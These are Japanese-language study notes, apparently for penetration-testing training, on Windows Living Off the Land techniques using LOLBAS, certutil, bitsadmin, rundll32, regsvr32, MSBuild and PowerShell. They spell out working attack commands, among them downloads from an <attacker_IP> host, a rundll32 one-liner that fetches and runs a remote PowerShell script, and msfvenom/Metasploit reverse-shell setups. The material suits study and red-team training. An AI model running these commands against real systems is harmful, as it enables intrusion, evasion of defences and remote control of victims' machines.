>[!NOTE]
>OSCP試験においては、このテクニックは求められない。

# Intro

- Living Off the Landは、レッドチーム・コミュニティのトレンド用語
- 名前の由来は「その土地で手に入る食べ物を食べて生活する」という現実の概念から来ている
- 攻撃者やマルウェア作成者が、ターゲットコンピュータに内蔵されているツールやユーティリティを活用するという概念を指す

- 組み込みツールは通常の活動に使われるが、例えば `CertUtil` を使って悪意のあるファイルをダウンロードするなど、悪用事例が増加している
- 主な思想は、Microsoftが署名したプログラム・スクリプト・ライブラリを使うことで、防御制御に紛れ込み回避すること
- レッドチーマーはステルス性維持のためにこれらのツールを活用する

- Living Off the Landが包含する主なカテゴリー：
	- Reconnaissance
	- Files operations
	- Arbitrary code execution
	- Lateral movement
	- Security product bypass

---

# Windows Sysinternals

## Windows Sysinternalsとは？

- ITプロフェッショナルがWindows OSを管理・トラブルシューティング・診断するために開発された、高度なシステムユーティリティのセット

- Sysinternals Suiteは以下のカテゴリーに分かれている：
	- Disk management
	- Process management
	- Networking tools
	- System information
	- Security tools

- 使用するにはMicrosoftライセンス契約への同意が必要
	- コマンドプロンプトで `-accepteula`（End User Licence Agreement）引数を渡すか、GUI上で同意する

### 代表的なツール

| ツール                                                                              | 概要                                                      |
| -------------------------------------------------------------------------------- | ------------------------------------------------------- |
| [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)   | ファイル・ディレクトリ・レジストリキー・グローバルオブジェクト・Windowsサービスの指定アクセスをチェック |
| [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)         | リモートシステム上でプログラムを実行                                      |
| [ADExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) | ADのDBを簡単に閲覧・管理                                          |
| [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)     | CPUスパイク監視および分析用メモリダンプ                                   |
| [ProcMon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)       | プロセス監視に不可欠なツール                                          |
| [TCPView](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview)       | 全TCPおよびUDP接続を一覧表示                                       |
| [PsTools](https://docs.microsoft.com/en-us/sysinternals/downloads/pstools)       | Sysinternalsスイートの初期ツール群。詳細情報をリストアップ                     |
| [Portmon](https://docs.microsoft.com/en-us/sysinternals/downloads/portmon)       | システム上の全シリアル・パラレルポートの動作を監視・表示                            |
| [Whois](https://docs.microsoft.com/en-us/sysinternals/downloads/whois)           | 指定したドメイン名またはIPアドレスの情報を提供                                |

- 🔗[Sysinternalsの詳細](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)

## Sysinternals Live

- Windows Sysinternalsの大きな特徴の一つは、インストール不要で使える点
- MicrosoftはSysinternals Liveサービスを提供しており、以下の方法でアクセス・使用できる：
	- Webブラウザ（🔗[link](https://live.sysinternals.com/)）
	- Windows Share
	- コマンドプロンプト
- ツールを使うには、ダウンロードするか、Sysinternals Liveのパス `\\live.sysinternals.com\tools` をWindows Explorer（File Explorer）に入力する

![](../Images/Pasted%20image%2020230623122205.png)

- Sysinternalsについてさらに学びたい場合は[こちら](https://docs.microsoft.com/en-us/sysinternals/resources/)

## 攻撃者による活用とメリット

- 組み込みツールやSysinternalsツールはシステム管理者にとって有用だが、OS内に内在する信頼性により、ハッカー・マルウェア・ペンテスターにも悪用されている
- この信頼性により、ターゲットシステムのセキュリティコントロールによる検出・捕捉が困難になる
- 検知やブルーチームの制御を回避するために使用されることが多い

- 最近これらのツールを悪用する攻撃者が増加しているため、ブルーチームも悪意ある使用法を認識しており、防御制御を実装している

---

# LOLBAS Project

## LOLBASとは？

- https://lolbas-project.github.io/
- LOLBASとは Living Off the Land Binaries And Scripts の略
- Microsoftが署名した組み込みツール（バイナリ・スクリプト・ライブラリ）を集め、文書化することを目的としたプロジェクト
- Binary・Functions・スクリプト・ATT&CK情報に基づいて検索可能

![](../Images/Pasted%20image%2020260308170929.png)


## 検索方法

- バイナリ名を入力するだけで検索できる
- 特定の機能を探す場合は、関数名の前に `/` を付ける（例: `/execute` で全実行関数を検索）
- 型に基づいて検索する場合は `#` 記号の後に型名を続ける

### プロジェクトに含まれる型

- Script
- Binaries
- Libraries
- OtherMSBinaries

### 主な機能カテゴリー

以下の機能に適合するツールが掲載されている：

- 任意のコード実行
- ファイルのダウンロード・アップロード・コピーを含むファイル操作
- コードのコンパイル
- 代替データストリーム（ADS）にデータを隠したり、ログオン時に実行するなどの永続化
- UACバイパス
- プロセスメモリのダンプ
- DLLインジェクション

---

# File操作

## Certutil

- Certutilは、認証サービスを処理するためのWindows組み込みユーティリティ
- 認証局（CA）構成情報およびその他のCAコンポーネントをダンプして表示するために使用される
- 通常の用途は証明書情報の取得だが、**認証サービスとは無関係なファイルの転送やエンコードが可能**であることが判明している
- MITRE ATT&CKフレームワークでは Ingress Tool Transfer（🔗[T1105](https://attack.mitre.org/techniques/T1105/)）として識別
- 主に、不審なファイル転送やファイルの隠蔽に使用される


攻撃者のWebサーバーからファイルをダウンロードし、WindowsのTempフォルダに保存する
```powershell
certutil -URLcache -split -f http://<attacker_IP>:<PORT>/<File> C:\Windows\Temp\<File>
```
- `-URLcache`：URLオプションを有効にする
- `-split -f`：指定されたURLからファイルを分割して強制取得する

ファイルをBase64エンコード・デコードするエンコーディングツールとしても使用可能（ATT&CK 🔗[T1027](https://attack.mitre.org/techniques/T1027/)）：
```powershell
certutil -encode <エンコードするファイル> <エンコード後のファイル名>
certutil -decode <デコードするファイル> <デコード後のファイル名>
```
- 詳細は🔗[Microsoft Docs: CertUtil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)

## BITSAdmin

- Background Intelligent Transfer Service（BITS）ジョブの作成・ダウンロード・アップロード・進行状況確認に使用できるシステム管理者用ユーティリティ
- 🔗[BITS](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) は、HTTPウェブサーバーやSMBサーバーからファイルをダウンロード・アップロードするための低帯域幅・非同期な方法
- 攻撃者はBITSジョブを悪用して、侵害済みマシンに悪意のあるペイロードをダウンロード・実行できる
- ATT&CK 🔗[T1197](https://attack.mitre.org/techniques/T1197/)
- 主に、悪意のあるペイロードのダウンロードや実行に使用される

指定したURLからファイルをダウンロード
```powershell
bitsadmin.exe /transfer /Download /priority Foreground http://<attacker_IP>/<File> c:\Users\thm\Desktop\<File>
```
- `/transfer`：転送オプションを使用する
- `/Download`：ダウンロードタイプとして転送を指定
- `/priority Foreground`：最優先でフォアグラウンド実行

- パラメータの詳細は 🔗[Microsoft documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer)

## FindStr

- 🔗[Findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) は、ファイル内のテキストや文字列パターンを検索するためのMicrosoft組み込みツール
- 通常はファイルや解析済み出力の内容検索に使用される（例：`netstat -an | findstr "445"`）
- **SMB共有フォルダからリモートファイルをダウンロードできる**ことが判明している

SMB共有フォルダからリモートファイルをダウンロード
```powershell
findstr /V <dummy_string> \\<MachineName>\<ShareFolder>\<file> > c:\Windows\Temp\<file>
```
- `/V`：指定された文字列を含まない行を出力する
- `<dummy_string>`：ファイル内に存在しない文字列を指定することで、全行を出力させる

> [!NOTE]
> ファイル操作には他のツールも使える。LOLBASプロジェクトで確認すること。

---

# File実行

- OSに内蔵されている他のシステムバイナリを悪用してペイロードの実行を実現する手法
- ペイロードのプロセスを隠蔽・偽装できる
- MITRE ATT&CKフレームワークでは **Signed Binary Proxy Execution** または **Indirect Command Execution** と呼ばれる
- 防御制御の回避にも有効

## File Explorer

- File ExplorerはWindows用のファイルマネージャーおよびシステムコンポーネント
- `explorer.exe` を悪用して、信頼できる親プロセスから悪意のあるスクリプトや実行可能ファイルを起動できる（Indirect Command Execution）

- バイナリの場所：
	- 32bit：`C:\Windows\explorer.exe`
	- 64bit：`C:\Windows\SysWOW64\explorer.exe`

`explorer.exe` を親プロセスとして子プロセスを生成
```powershell
explorer.exe /root,"<file_to_execute>"
```

## WMIC

- Windows Management Instrumentation（WMIC）は、Windowsコンポーネントを管理するコマンドラインユーティリティ
- 防御策を回避するためのバイナリ実行にも悪用される
- MITRE ATT&CK：Signed Binary Proxy Execution（🔗[T1218](https://attack.mitre.org/techniques/T1218/)）

任意のバイナリの新しいプロセスを作成（例：`calc.exe`）
```powershell
wmic.exe process call create calc
```
- `process`：プロセスに関連する情報を操作するオブジェクト
- `call create`：`process` オブジェクトに対して新しいプロセスを作成するメソッド呼び出し

## Rundll32

- OS内でDLLファイルをロードして実行するMicrosoft組み込みのツール
- 任意のペイロード実行や、JavaScriptおよびPowerShellスクリプトの実行に悪用できる
- MITRE ATT&CK：Signed Binary Proxy Execution（🔗[T1218](https://attack.mitre.org/techniques/T1218/011/)）

- バイナリの場所：
	- 32bit：`C:\Windows\System32\rundll32.exe`
	- 64bit：`C:\Windows\SysWOW64\rundll32.exe`

`rundll32.exe` を使って `calc.exe` を実行（`calc` の部分を対象ファイル名に変更する）
```powershell
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```

リモートからPowerShellスクリプトをダウンロードして実行
```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<attacker_IP>:<PORT>/<file>.ps1');");
```

---

# Application ホワイトリストのバイパス

- アプリケーションホワイトリストは、悪意のある未承認プログラムがリアルタイムで実行されるのを防ぐMicrosoftのエンドポイントセキュリティ機能
- ルールベースで、承認済みアプリケーション・実行可能ファイルのリストを指定する

## Regsvr32

- WindowsレジストリにDLLを登録・登録解除するMicrosoftコマンドラインツール

- バイナリの場所：
	- 32bit：`C:\Windows\System32\regsvr32.exe`
	- 64bit：`C:\Windows\SysWOW64\regsvr32.exe`

- 任意のバイナリ実行や、Windowsアプリケーションホワイトリスティングの回避に悪用できる
- ATT&CKの3番目に人気のある手法
- Microsoftの信頼済みコンポーネントを使用し、メモリ内で実行されるため、アプリホワイトリストをバイパスできる

### 例（Meterpreterシェル取得）

> [!NOTE]
> 以下は32bit OSバージョンでの手順。64bitの場合は `regsvr32.exe` のパスと `msfvenom` のアーキテクチャが変わる。

1. 悪意のあるDLLファイルを作成（32bit OS向け）
```zsh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=<PORT> -f dll -a x86 > <file_name>.dll
```

2. Metasploitのリスナーをセットアップ
```zsh
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <attacker_IP>; set LPORT <PORT>; run"
```

3. ペイロード配信用サーバをセットアップ
```zsh
python -m http.server
```

4. ターゲットマシンに悪意のあるDLLをダウンロード
```powershell
certutil -URLcache -split -f http://<attacker_IP>:<PORT>/<File> C:\Windows\Temp\<File>
```

5. `regsvr32.exe` で実行：

シンプルな方法
```powershell
c:\Windows\System32\regsvr32.exe <path_to_malicious_dll_file>
```

高度な方法
```powershell
c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct <path_to_malicious_dll_file>
```
- `/s`：サイレントモード（メッセージを表示しない）
- `/n`：DLLレジスターサーバーを呼び出さない
- `/i:`：`/n` 使用時に別のサーバーを指定
- `/u`：unregisterメソッドで実行

## Bash（WSL経由）

- MicrosoftはWindows 10/11・Server 2019でLinux環境のサポートを追加した
- この機能はWindows Subsystem for Linux（🔗[WSL](https://docs.microsoft.com/en-us/windows/wsl/about)）として知られ、🔗[WSL1とWSL2](https://docs.microsoft.com/en-us/windows/wsl/compare-versions)が存在する
- WSLはHyper-V仮想化Linuxディストリビューションで、Linuxカーネルとシステムコールのサブセットをサポート
- `bash.exe` はLinux環境と対話するためのMicrosoftツール

- `bash.exe` はMicrosoftの署名付きバイナリであるため、Windowsアプリケーションホワイトリストのバイパスに悪用できる
```powershell
bash.exe -c <path-to-payload>
```

- MITRE ATT&CK：Indirect Command Execution（🔗[T1202](https://attack.mitre.org/techniques/T1202/)）

![600](../Images/Pasted%20image%2020230623172928.png)

> [!NOTE]
> `bash.exe` を使用するには、Windows 10でWindows Subsystem for Linuxが有効かつインストールされている必要がある。

---

# その他のテクニック

## Shortcuts

- ショートカット（シンボリックリンク）は、OS内で他のファイルやアプリケーションを参照するためのテクニック
- ユーザーがクリックすると参照先のファイルやアプリケーションが実行される
- 攻撃者は初期アクセス・権限昇格・永続性の取得に悪用する
- MITRE ATT&CK：🔗[T1547](https://attack.mitre.org/techniques/T1547/009/)

- ショートカット変更テクニックでは、`Target:`に以下のいずれかを設定してファイルを実行する：
	- Rundll32
	- PowerShell
	- Regsvr32
	- Executable on disk

![200](../Images/Pasted%20image%2020230623173348.png)

- 上図の例では、攻撃者がExcelのショートカットのTarget:を変更し、`rundll32.exe` を使って `calc.exe` を実行させている
- ターゲットがExcelのショートカットアイコンをクリックすると、`calc.exe` が実行される
- 詳細は🔗[こちら](https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md)のGitHubリポジトリを参照

## No PowerShell!（PowerLessShell）

### 基本

- 🔗[PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell.git)
- 2019年、Red Canaryの脅威検出レポートで、PowerShellが悪意のある活動に最も使用される手法であることが報告された
- これにより組織が `powershell.exe` の実行を監視・ブロックするようになったため、**攻撃者は `powershell.exe` を使用せずスクリプトを実行する**手法が必要となった

- PowerLessShellはPythonベースのツールで、PowerShellプロセスを表示せずにターゲットマシンで実行する悪意のあるコードを生成する
- Microsoft Build Engine（MSBuild）を悪用してリモートコード実行を実現する

### 手順

1. PowerLessShellをダウンロード：
```zsh
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
```

2. MSBuildで動作するPowerShellペイロードを生成：
```zsh
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=<attacker_IP> LPORT=<PORT> -f psh-reflection > <file>.ps1
```

3. Metasploitリスナーをセットアップ：
```zsh
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT <PORT>; run"
```

4. ペイロードをMSBuildと互換性のある形式に変換：
```zsh
python2 PowerLessShell.py -type powershell -source <path to created payload> -output <file>.csproj
```

5. ペイロードをターゲットマシンに転送：
```zsh
python -m http.server
```
```powershell
certutil -URLcache -split -f http://<attacker_IP>:<PORT>/<File> C:\Windows\Temp\<File>
```

6. ターゲットマシンで `.csproj` ファイルをビルドして実行：
```powershell
c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <path to csproj file>
```


## PowerShell ポートスキャン

シチュエーション：侵害した足場がWindowsマシンで、内部ネットワーク上の機器をスキャンする必要がある場合に使用（Ligolo-ngを使ってトンネリングできる場合は不要）

1つのポートのTCP接続確認
```powershell
Test-NetConnection -Port <Port> <target_IP>
```
- 結果：`TcpTestSucceeded : True`

ホストディスカバリ（サブネット全体のポート探索）
```powershell
$subnet = "<第三オクテットまでのIP>"
1..254 | ForEach-Object {
  $ip = "$subnet.$_"
  if (Test-NetConnection -ComputerName $ip -Port <Port> -InformationLevel Quiet) {
    "$ip`:<Port> open"
  }
}
```

ポートスキャンの自動化（1〜1024ポート）
```powershell
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("<target_IP>", $_)) "TCP port $_ is open"} 2>$null
```
- `Net.Sockets.TcpClient` オブジェクトを作成し、対象IPの各ポートにTCP接続を試行
- 接続成功したポートのみログ表示
- `%` は `ForEach-Object` の別名。パイプの前の値が `$_` に格納される
- ポートがopenなら `echo` で表示、closedならエラーとして `$null` に格納（非表示）